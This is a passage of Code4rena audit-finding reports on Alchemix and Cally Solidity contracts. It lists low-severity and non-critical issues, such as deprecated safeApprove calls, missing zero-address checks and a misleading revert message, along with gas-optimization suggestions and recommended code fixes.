    "body": "**Table of Contents:**\n\n- [[L-01] Add constructor initializers](#l-01-add-constructor-initializers)\n- [[L-02] Deprecated safeApprove() function](#l-02-deprecated-safeapprove-function)\n- [[N-01] Open TODOS](#n-01-open-todos)\n- [[N-02] Deprecated library used for Solidity 0.8.+ SafeMath](#n-02-deprecated-library-used-for-solidity-08-safemath)\n- [[N-03] Unused named returns](#n-03-unused-named-returns)\n\n## [L-01] Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n```solidity\ncontracts-full/CrossChainCanonicalAlchemicTokenV2.sol:\n   8:   function initialize(\n   9        string memory name, \n  10        string memory symbol, \n  11        address[] memory _bridgeTokens\n  12:   ) public initializer {\n\n\ncontracts-full/CrossChainCanonicalGALCX.sol:\n   7:   function initialize(\n   8        string memory name, \n   9        string memory symbol, \n  10        address[] memory _bridgeTokens\n  11:   ) public initializer {\n```\n\n## [L-02] Deprecated safeApprove() function\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:\n\n```solidity\ncontracts-full/AlchemistV2.sol:\n  382:         TokenUtils.safeApprove(yieldToken, config.adapter, type(uint256).max);\n  383:         TokenUtils.safeApprove(adapter.underlyingToken(), config.adapter, type(uint256).max);\n  478:         TokenUtils.safeApprove(yieldToken, adapter, type(uint256).max);\n  479:         TokenUtils.safeApprove(ITokenAdapter(adapter).underlyingToken(), adapter, type(uint256).max);\n\ncontracts-full/EthAssetManager.sol:\n  576:             SafeERC20.safeApprove(address(tokens[i]), address(metaPool), 0);\n  577:             SafeERC20.safeApprove(address(tokens[i]), address(metaPool), amounts[i]);\n  620:             SafeERC20.safeApprove(address(token), address(metaPool), 0);\n  621:             SafeERC20.safeApprove(address(token), address(metaPool), amount);\n  671:         SafeERC20.safeApprove(address(metaPool), address(convexBooster), 0);\n  672:         SafeERC20.safeApprove(address(metaPool), address(convexBooster), amount);\n\ncontracts-full/ThreePoolAssetManager.sol:\n  782:             SafeERC20.safeApprove(address(tokens[i]), address(threePool), 0);\n  783:             SafeERC20.safeApprove(address(tokens[i]), address(threePool), amounts[i]);\n  838:         SafeERC20.safeApprove(address(token), address(threePool), 0);\n  839:         SafeERC20.safeApprove(address(token), address(threePool), amount);\n  879:         SafeERC20.safeApprove(address(threePoolToken), address(threePool), 0);\n  880:         SafeERC20.safeApprove(address(threePoolToken), address(threePool), amount);\n  908:             SafeERC20.safeApprove(address(tokens[i]), address(metaPool), 0);\n  909:             SafeERC20.safeApprove(address(tokens[i]), address(metaPool), amounts[i]);\n  944:         SafeERC20.safeApprove(address(token), address(metaPool), 0);\n  945:         SafeERC20.safeApprove(address(token), address(metaPool), amount);\n  987:         SafeERC20.safeApprove(address(metaPool), address(convexBooster), 0);\n  988:         SafeERC20.safeApprove(address(metaPool), address(convexBooster), amount);\n\ncontracts-full/TransmuterBuffer.sol:\n  236:                 TokenUtils.safeApprove(registeredUnderlyings[i], alchemist, 0); ////\n  238:             TokenUtils.safeApprove(debtToken, alchemist, 0); ////\n  243:             TokenUtils.safeApprove(registeredUnderlyings[i], alchemist, type(uint256).max); ////\n  245:         TokenUtils.safeApprove(debtToken, alchemist, type(uint256).max); ////\n  284:         TokenUtils.safeApprove(underlyingToken, alchemist, type(uint256).max); ////\n\ncontracts-full/adapters/fuse/FuseTokenAdapterV1.sol:\n  71:         SafeERC20.safeApprove(underlyingToken, token, amount);\n\ncontracts-full/adapters/lido/WstETHAdapterV1.sol:\n  105:         SafeERC20.safeApprove(parentToken, address(token), mintedStEth);\n  129:         SafeERC20.safeApprove(parentToken, curvePool, unwrappedStEth);\n\ncontracts-full/adapters/vesper/VesperAdapterV1.sol:\n  62:         SafeERC20.safeApprove(underlyingToken, token, amount);\n\ncontracts-full/adapters/yearn/YearnTokenAdapter.sol:\n  32:         TokenUtils.safeApprove(underlyingToken, token, amount);\n```\n\n## [N-01] Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\nFile: IStableMetaPool.sol\n6: /// @dev TODO\n7: uint256 constant N_COINS = 2;\n```\n\n## [N-02] Deprecated library used for Solidity 0.8.+ SafeMath\n\n```solidity\ncontracts-full/TransmuterBuffer.sol:\n   7: import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n  27:     using SafeMath for uint256;\n```\n\n## [N-03] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\ncontracts-full/EthAssetManager.sol:\n  367:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  380:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  393:     ) external lock onlyOperator returns (uint256 withdrawn) { //@audit unused named returns\n  404:     ) external lock onlyOperator returns (bool success) { //@audit unused named returns\n  415:     ) external lock onlyOperator returns (bool success) { //@audit unused named returns\n  521:     ) external lock onlyAdmin returns (bytes memory result) { //@audit unused named returns\n\ncontracts-full/ThreePoolAssetManager.sol:\n  334:     ) public view returns (uint256 delta, bool add) { //@audit unused named returns\n  534:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  547:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  560:     ) external lock onlyOperator returns (uint256 withdrawn) { //@audit unused named returns\n  571:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  584:     ) external lock onlyOperator returns (uint256 minted) { //@audit unused named returns\n  597:     ) external lock onlyOperator returns (uint256 withdrawn) { //@audit unused named returns\n  608:     ) external lock onlyOperator returns (bool success) { //@audit unused named returns\n  619:     ) external lock onlyOperator returns (bool success) { //@audit unused named returns\n\ncontracts-full/TransmuterBuffer.sol:\n  134:         returns (uint256 weight) //@audit unused named returns\n\ncontracts-full/TransmuterV2.sol:\n  350:   function getUnexchangedBalance(address owner) external view override returns (uint256 unexchangedBalance) { //@audit unused named returns\n  370:   function getExchangedBalance(address owner) external view override returns (uint256 exchangedBalance) { //@audit unused named returns\n  374:   function getClaimableBalance(address owner) external view override returns (uint256 claimableBalance) { //@audit unused named returns\n  554:   function _getExchangedBalance(address owner) internal view returns (uint256 exchangedBalance) { //@audit unused named returns\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/215"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## G01 - Use ```immutable``` instead of ```constant``` expressions.\n\nConstants expressions are recomputed each time when it used in code, it's cost some gas instead of immutable, which would compute only once in the constructor.\n\nUse ```immutable``` instead of ```constant``` or hardcode expressions values in constants with accompanying comments.\n\n```solidity\ncontracts-full/AlchemicTokenV1.sol:22    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN\");\ncontracts-full/AlchemicTokenV1.sol:25    bytes32 public constant SENTINEL_ROLE = keccak256(\"SENTINEL\");\n\ncontracts-full/AlchemicTokenV2.sol:21    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN\");\ncontracts-full/AlchemicTokenV2.sol:24    bytes32 public constant SENTINEL_ROLE = keccak256(\"SENTINEL\");\ncontracts-full/AlchemicTokenV2.sol:27    bytes32 public constant CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\ncontracts-full/AlchemicTokenV2Base.sol:22    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN\");\ncontracts-full/AlchemicTokenV2Base.sol:25    bytes32 public constant SENTINEL_ROLE = keccak256(\"SENTINEL\");\ncontracts-full/AlchemicTokenV2Base.sol:28    bytes32 public constant CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\ncontracts-full/TransmuterBuffer.sol:31    bytes32 public constant ADMIN = keccak256(\"ADMIN\");\ncontracts-full/TransmuterBuffer.sol:34    bytes32 public constant KEEPER = keccak256(\"KEEPER\");\n\ncontracts-full/TransmuterV2.sol:96    address public constant ZERO_ADDRESS = address(0);\ncontracts-full/TransmuterV2.sol:99    bytes32 public constant ADMIN = keccak256(\"ADMIN\");\ncontracts-full/TransmuterV2.sol:102    bytes32 public constant SENTINEL = keccak256(\"SENTINEL\");\n\n```\n\n\n## G02 - Emitting memory variables\n\nCheaper to emit memory values already existing inside the function instead of additional reading state variables from storage.\n\n```solidity\ncontracts-full/AlchemicTokenV2.sol:94    emit SetFlashMintFee(flashMintFee); // Could emit newFee\n\ncontracts-full/AlchemicTokenV2Base.sol:100    emit SetFlashMintFee(flashMintFee);  // Could emit newFee\n\ncontracts-full/TransmuterV2.sol:203    emit Paused(isPaused); // Could emit pauseState\n\ncontracts-full/TransmuterBuffer.sol:247    emit SetAlchemist(alchemist); // Could emit _alchemist\n\n```\n\n## G03 - Don’t use too long error message  \n\nRevert messages in require statements that fit in 32 bytes would cost lower gas.\n\nAdditionally, using a custom ```error``` instead of a revert string could save some gas.\n\n```solidity\ncontracts-full/AlchemicTokenV1.sol:51    require(whiteList[msg.sender], \"AlTokenV1: Alchemist is not whitelisted\");\ncontracts-full/AlchemicTokenV1.sol:81    require(total <= ceiling[msg.sender], \"AlUSD: Alchemist's ceiling was breached.\");\n\ncontracts-full/StakingPools.sol:106    require(_governance != address(0), \"StakingPools: governance address cannot be 0x0\");\ncontracts-full/StakingPools.sol:124    require(_pendingGovernance != address(0), \"StakingPools: pending governance address cannot be 0x0\");\ncontracts-full/StakingPools.sol:131    require(msg.sender == pendingGovernance, \"StakingPools: only pending governance\");\ncontracts-full/StakingPools.sol:160    require(tokenPoolIds[_token] == 0, \"StakingPools: token already has a pool\");\ncontracts-full/StakingPools.sol:183    require(_rewardWeights.length == _pools.length(), \"StakingPools: weights length mismatch\");\n\n```\n\n## G04 - Cache array length before ```for``` loops\n\nReading array length inside ```for``` loop costs more gas than reading its cached value.\n\n```solidity\ncontracts-full/AlchemistV2.sol:990    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1282    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1355    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1461    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1524    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\n\ncontracts-full/CrossChainCanonicalBase.sol:57    for (uint256 i = 0; i < _bridgeTokens.length; i++){\ncontracts-full/CrossChainCanonicalBase.sol:141    for (uint i = 0; i < bridgeTokensArray.length; i++){\n\ncontracts-full/StakingPools.sol:188    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\ncontracts-full/StakingPools.sol:363    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\n\ncontracts-full/TransmuterBuffer.sol:172    for (uint256 i = 0; i < _yieldTokens[underlyingToken].length; i++) {\ncontracts-full/TransmuterBuffer.sol:186    for (uint256 i = 0; i < tokens.length; i++) {\ncontracts-full/TransmuterBuffer.sol:235    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:242    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:272    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:382    for (uint256 j = 0; j < registeredUnderlyings.length; j++) {\ncontracts-full/TransmuterBuffer.sol:479    for (uint256 j = 0; j < weighting.tokens.length; j++) {\n\ncontracts-full/base/Multicall.sol:14    for (uint256 i = 0; i < data.length; i++) {\n\n\n```\n \n## G05 - Use prefix counter incrementing ```++i``` since it cost less gas than  ```i++```.\n\n```solidity\ncontracts-full/AlchemistV2.sol:990    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1282    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1355    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1461    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1524    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\n\ncontracts-full/CrossChainCanonicalBase.sol:57    for (uint256 i = 0; i < _bridgeTokens.length; i++){\ncontracts-full/CrossChainCanonicalBase.sol:141    for (uint i = 0; i < bridgeTokensArray.length; i++){\n\ncontracts-full/EthAssetManager.sol:214    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/EthAssetManager.sol:567    for (uint256 i = 0; i < NUM_META_COINS; i++) {\n\ncontracts-full/StakingPools.sol:188    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\ncontracts-full/StakingPools.sol:363    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\n\ncontracts-full/ThreePoolAssetManager.sol:250    for (uint256 i = 0; i < NUM_STABLE_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:254    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:353    for (uint256 i = 0; i < 256; i++) {\ncontracts-full/ThreePoolAssetManager.sol:773    for (uint256 i = 0; i < NUM_STABLE_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:902    for (uint256 i = 0; i < NUM_META_COINS; i++) {\n\ncontracts-full/TransmuterBuffer.sol:172    for (uint256 i = 0; i < _yieldTokens[underlyingToken].length; i++) {\ncontracts-full/TransmuterBuffer.sol:186    for (uint256 i = 0; i < tokens.length; i++) {\ncontracts-full/TransmuterBuffer.sol:235    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:242    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:272    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:382    for (uint256 j = 0; j < registeredUnderlyings.length; j++) {\ncontracts-full/TransmuterBuffer.sol:387    for (uint256 i = 0; i < numYTokens; i++) {\ncontracts-full/TransmuterBuffer.sol:479    for (uint256 j = 0; j < weighting.tokens.length; j++) {\n\ncontracts-full/base/Multicall.sol:14    for (uint256 i = 0; i < data.length; i++) {\n\n```\n\n## G06 - For computations that can’t underflow/overflow use ```unchecked```\n\nUsing ```unchecked``` blocks for operations that can’t underflow/overflow could save a lot of gas, especially inside ```for``` loops.\n\nCounter ```i``` with type ```uint256``` could be safely incremented in ```unchecked``` block at the end of loop code, like:\n```solidity\nfor (uint256 i; i < n;) {\n    …\n    unchecked { ++i; }\n}\n```\n\nCheck comments on lines for other cases than ```for``` loop, where unchecked could be used.\n\n```solidity\ncontracts-full/AlchemistV2.sol:468    _yieldTokens[yieldToken].creditUnlockRate = FIXED_POINT_SCALAR / blocks; // Could be unchecked since blocks > 0, checked on L466\ncontracts-full/AlchemistV2.sol:933    uint256 distributeAmount = amountUnderlyingTokens - feeAmount; // Could be unchecked since feeAmount can’t be grater than amountUnderlyingTokens due to protocolFee <= BPS  L442\ncontracts-full/AlchemistV2.sol:990    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1014    uint256 harvestable = _convertUnderlyingTokensToYield(yieldToken, currentValue - expectedValue); // Could be unchecked because checked on L1010\ncontracts-full/AlchemistV2.sol:1282    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1355    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1461    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1493    _accounts[recipient].balances[yieldToken] += shares; // Could be unchecked because if overflow happens it will be checked on L1494 since totalShares always >= any individual balance\ncontracts-full/AlchemistV2.sol:1508    _yieldTokens[yieldToken].totalShares -= shares; // Could be unchecked because  if underflow happens it will be checked on L11507 since any individual balance always <= totalShares \ncontracts-full/AlchemistV2.sol:1524    for (uint256 i = 0; i < depositedTokens.values.length; i++) {\ncontracts-full/AlchemistV2.sol:1569    uint256 harvestable = _convertUnderlyingTokensToYield(yieldToken, currentValue - expectedValue); // Could be unchecked because checked on L1569\n\ncontracts-full/CrossChainCanonicalBase.sol:57    for (uint256 i = 0; i < _bridgeTokens.length; i++){\ncontracts-full/CrossChainCanonicalBase.sol:141    for (uint i = 0; i < bridgeTokensArray.length; i++){\n\ncontracts-full/EthAssetManager.sol:214    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/EthAssetManager.sol:549    uint256 reduction = totalCliffs - cliff; // // Cliff can’t be grater than totalCloffs, checked on L547\ncontracts-full/EthAssetManager.sol:567    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/EthAssetManager.sol:589    if (value > address(this).balance) weth.withdraw(value - address(this).balance); // Could be unchecked since if statement checks underflow\ncontracts-full/EthAssetManager.sol:629    if (value > address(this).balance) weth.withdraw(value - address(this).balance); // Could be unchecked since if statement checks underflow\ncontracts-full/EthAssetManager.sol:721    return x > y ? x - y : y - x; // Could be unchecked due to return statement logic\n\ncontracts-full/StakingPools.sol:188    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\ncontracts-full/StakingPools.sol:363    for (uint256 _poolId = 0; _poolId < _pools.length(); _poolId++) {\n\ncontracts-full/ThreePoolAssetManager.sol:250    for (uint256 i = 0; i < NUM_STABLE_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:254    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:353    for (uint256 i = 0; i < 256; i++) {\ncontracts-full/ThreePoolAssetManager.sol:399    return v.minimizedBalance > v.startingBalance // Could be unchecked due to return statement logic     \ncontracts-full/ThreePoolAssetManager.sol:751    uint256 reduction = totalCliffs - cliff; // Cliff can’t be grater than totalCloffs, checked on L749\ncontracts-full/ThreePoolAssetManager.sol:773    for (uint256 i = 0; i < NUM_STABLE_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:902    for (uint256 i = 0; i < NUM_META_COINS; i++) {\ncontracts-full/ThreePoolAssetManager.sol:1037    return x > y ? x - y : y - x; // Could be unchecked due to return statement logic\n\ncontracts-full/TransmuterBuffer.sol:172    for (uint256 i = 0; i < _yieldTokens[underlyingToken].length; i++) {\ncontracts-full/TransmuterBuffer.sol:186    for (uint256 i = 0; i < tokens.length; i++) {\ncontracts-full/TransmuterBuffer.sol:235    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:242    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:272    for (uint256 i = 0; i < registeredUnderlyings.length; i++) {\ncontracts-full/TransmuterBuffer.sol:382    for (uint256 j = 0; j < registeredUnderlyings.length; j++) {\ncontracts-full/TransmuterBuffer.sol:387    for (uint256 i = 0; i < numYTokens; i++) {\ncontracts-full/TransmuterBuffer.sol:429    if (localBalance - amount < currentExchanged[underlyingToken]) { // Could be unchecked since amount <= localBalance, checked on L421\ncontracts-full/TransmuterBuffer.sol:479    for (uint256 j = 0; j < weighting.tokens.length; j++) {\ncontracts-full/TransmuterBuffer.sol:541    want = flowAvailable[underlyingToken] - initialLocalBalance; // Could be unchecked since checked on L539\n\n\ncontracts-full/TransmuterV2.sol:551    return amount / conversionFactor; // Could be unchecked since conversionFactor can’t be 0 \n\ncontracts-full/base/Multicall.sol:14    for (uint256 i = 0; i < data.length; i++) {\n\ncontracts-full/libraries/Sets.sol:42    index--; // Could be unchecked since index > 0, checked on L37\n\n```\n\n## G07 - Caching storage variables\n\nSince reading from ```memory``` is much cheaper than reading from ```storage```, state variables that are called more than 1 SLOAD inside the function should be cached.\n\n```solidity \ncontracts-full/EthAssetManager.sol:429    SafeERC20.safeTransfer(address(convexToken), rewardReceiver, convexBalance); // rewardReceiver 2 SLOADs \ncontracts-full/EthAssetManager.sol:500    IERC20TokenReceiver(transmuterBuffer).onERC20Received(address(weth), amount); // address(weth) and transmuterBuffer, both 2 SLOADs\ncontracts-full/EthAssetManager.sol:699    SafeERC20.safeTransfer(address(convexToken), rewardReceiver, convexBalance); // rewardReceiver 2 SLOADs \n\ncontracts-full/ThreePoolAssetManager.sol:633    SafeERC20.safeTransfer(address(convexToken), rewardReceiver, convexBalance); // rewardReceiver 2 SLOADs\ncontracts-full/ThreePoolAssetManager.sol:721    IERC20TokenReceiver(transmuterBuffer).onERC20Received(address(token), amount);  // transmuterBuffer 2 SLOADs\ncontracts-full/ThreePoolAssetManager.sol:1015    SafeERC20.safeTransfer(address(convexToken), rewardReceiver, convexBalance); //  rewardReceiver 2 SLOADs\n\ncontracts-full/TransmuterBuffer.sol:154    return flowAvailable[underlyingToken]; // flowAvailable[underlyingToken] 2 SLOADs\ncontracts-full/TransmuterBuffer.sol:245    TokenUtils.safeApprove(debtToken, alchemist, type(uint256).max); // alchemist 2 SLOADs after update and 4 SLOADs before update\ncontracts-full/TransmuterBuffer.sol:390    IAlchemistV2.YieldTokenParams memory params = IAlchemistV2(alchemist) //  alchemist 3 SLOADs\ncontracts-full/TransmuterBuffer.sol:406    IAlchemistV2(alchemist).mint(credit, address(this)); // alchemist 2 SLOADs\ncontracts-full/TransmuterBuffer.sol:446    uint256 tokensPerShare = IAlchemistV2(alchemist) // alchemist 3 SLOADs\ncontracts-full/TransmuterBuffer.sol:522    IAlchemistV2(alchemist).withdrawUnderlying(token, wantShares, address(this), minimumAmountOut); // alchemist 3 SLOADs\ncontracts-full/TransmuterBuffer.sol:551    exchangeDelta = flowAvailable[underlyingToken] - currentExchanged[underlyingToken]; // flowAvailable[underlyingToken] 5 SLOADs, \ncontracts-full/TransmuterBuffer.sol:568    IERC20TokenReceiver(amos[underlyingToken]).onERC20Received(underlyingToken, amount); // amos[underlyingToken] 2 SLOADs\n\ncontracts-full/TransmuterV2.sol:263    totalUnexchanged: totalUnexchanged, // state var totalUnexchanged 2 SLOADs\n\ncontracts-full/gALCX.sol:51    pools.withdraw(poolId, poolBalance); // poolId 2 SLOADs\n\n\n```\n\n\n## G08 - Set ```immutable``` variables that never change \n\n```solidity \ncontracts-full/TransmuterConduit.sol:13    address public token;\ncontracts-full/TransmuterConduit.sol:16    address public sourceTransmuter;\ncontracts-full/TransmuterConduit.sol:19    address public sinkTransmuter;\n\ncontracts-full/WETHGateway.sol:20    address public whitelist;\n\n```\n\n## G09 - Ordering of logical operators \n\nInsteaf of using: \n\n```solidity \ncontracts-full/TransmuterV2.sol:176     if (!hasRole(SENTINEL, msg.sender) && !hasRole(ADMIN, msg.sender)) {\n\n```\n\nWould be more gas efficient variant:\n\n```solidity \ncontracts-full/TransmuterV2.sol:176     if (!(hasRole(SENTINEL, msg.sender) || hasRole(ADMIN, msg.sender))) {\n\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/214"
    }
  },
  {
    "title": "QA Report",
    "body": "1. TransferOwnership should be two step process\n\nLack of two-step procedure for critical operations leaves them error-prone if the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\nAffected functions:\ngALCX.transferOwnership()\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nuse a two-step procedure for all non-recoverable critical operations to prevent irrecoverable mistakes.\n\n\n2. Missing zero address check\nThe following functions have missing zero address check for the corresponding parameter\n\nEthAssetManager.setOperator()\nEthAssetManager.setRewardReceiver()\nEthAssetManager.setTransmuterBuffer()\nAlchemicTokenV2Base.mint() - recipient param\nAlchemicTokenV1.mint() - recipient param\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nConsider adding zero address check\n\n\n3. Unsafe approve in AutoleverageBase.sol\nThe functions below made an approve call without checking the boolean result. ERC20 standard specify that the token can return false if the approve was not made, so it's mandatory to check the result of approve methods.\n\nFunctions affected:\n`AutoleverageBase.approve() `\n AutoleverageCurveMetapool._curveSwap()\nWETHGateWay.refreshAllowance()\n\n##Tools Used\nManual review\n\n## Recommended Mitigation Steps\nUse safe approve or check the boolean result",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/211"
    }
  },
  {
    "title": "QA Report",
    "body": "### 1. Wrong revert message (low)\n\nRevert message is now misleading\n\n## Proof of Concept\n\nRevert is performed (correctly) when dutchAuctionReserveStrike is too big, while the message states otherwise:\n\nhttps://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L169\n\n```solidity\nrequire(dutchAuctionReserveStrike < strikeOptions[dutchAuctionStartingStrikeIndex], \"Reserve strike too small\");\n```\n\n## Recommended Mitigation Steps\n\nConsider changing to:\n\n```solidity\nrequire(dutchAuctionReserveStrike < strikeOptions[dutchAuctionStartingStrikeIndex], \"Reserve strike too big\");\n```\n\n### 2. New operation initiating user facing functions miss emergency lever (non-critical)\n\nIf there be any emergency with system contracts, there is no way to temporary stop the operations.\n\n## Proof of Concept\n\nThe contract doesn't have pausing functionality for new operation initiation.\n\nFor example, createVault and buyOption cannot be temporary paused:\n\nhttps://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L148-L158\n\n```solidity\n    /// @notice Creates a new vault that perpetually sells calls\n    ///         on the underlying assets until a call option is exercised\n    ///         or the owner initiates a withdrawal.\n    /// @param tokenIdOrAmount The tokenId (NFT) or amount (ERC20) to vault\n    /// @param token The address of the NFT or ERC20 contract to vault\n    /// @param premiumIndex The index into the premiumOptions of each call that is sold\n    /// @param durationDays The length/duration of each call that is sold in days\n    /// @param dutchAuctionStartingStrikeIndex The index into the strikeOptions for the starting strike for each dutch auction\n    /// @param dutchAuctionReserveStrike The reserve strike for each dutch auction\n    /// @param tokenType The type of the underlying asset (NFT or ERC20)\n    function createVault(\n```\n\nhttps://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L203-L207\n\n```solidity\n    /// @notice Buys an option from a vault at a fixed premium and variable strike\n    ///         which is dependent on the dutch auction. Premium is credited to\n    ///         vault beneficiary.\n    /// @param vaultId The tokenId of the vault to buy the option from\n    function buyOption(uint256 vaultId) external payable returns (uint256 optionId) {\n```\n\n## Recommended Mitigation Steps\n\nConsider making all new actions linked user facing functions pausable, first of all createVault and buyOption.\n\nFor example, by using OpenZeppelin's approach:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol\n\n\n### 3. Exact strike msg.value can be cumbersome for users (non-critical)\n\nIt can be cumbersome for user to reproduce exact figure when manually dealing with the contract\n\n## Proof of Concept\n\nExercise now require exact strike to be sent over:\n\nhttps://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L271-L272\n\n```solidity\n        // check correct ETH amount was sent to pay the strike\n        require(msg.value == vault.currentStrike, \"Incorrect ETH sent for strike\");\n```\n\nStrike figure can have many meaningful digits as it's calculated via power law decline:\n\nhttps://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L419\n\n```solidity\nuint256 auctionStrike = (progress * progress * startingStrike) / (1e18 * 1e18);\n```\n\n## Recommended Mitigation Steps\n\nConsider allowing dust in msg.value (it will also align with premium logic):\n\n```solidity\n        // check correct ETH amount was sent to pay the strike\n        require(msg.value >= vault.currentStrike, \"Incorrect ETH sent for strike\");\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-cally-findings",
      "repo": "https://github.com/code-423n4/2022-05-cally-findings",
      "url": "https://github.com/code-423n4/2022-05-cally-findings/issues/311"
    }
  },
  {
    "title": "Gas Optimizations",
